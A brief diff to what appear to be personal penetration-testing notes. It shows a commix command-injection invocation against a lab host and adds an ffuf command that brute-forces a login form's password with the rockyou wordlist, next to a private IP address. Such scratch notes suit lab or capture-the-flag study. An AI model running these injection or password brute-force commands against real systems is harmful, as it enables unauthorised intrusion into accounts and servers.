@@ -104,4 +104,20 @@ python commix.py <params>
 --method=POST
 
 python commix.py --url="http://dnslookup.hv/" --data="query=slema" --method=POST
+--------------------------------------------------------------
+
+
+
+
+http://172.20.14.113/
+
+
+
+ffuf -u "http://******/" -X POST -d "email=********&password=FUZZ" -w /usr/share/wordlists/rockyou.txt -H "Content-Type: application/x-www-form-urlencoded"
+
+
+
+
+
+
 
